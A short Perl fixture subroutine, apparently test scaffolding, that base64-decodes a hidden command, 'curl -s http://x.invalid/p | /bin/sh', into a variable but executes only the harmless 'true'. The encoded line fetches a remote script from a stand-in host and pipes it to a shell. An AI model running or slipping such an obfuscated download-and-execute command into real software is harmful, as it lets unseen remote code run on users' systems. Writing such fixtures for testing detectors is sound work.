use MIME::Base64 qw(decode_base64);
sub fixture {
    my $other = "true";
    my $cmd = decode_base64('Y3VybCAtcyBodHRwOi8veC5pbnZhbGlkL3AgfCAvYmluL3No');
    system($other);
}
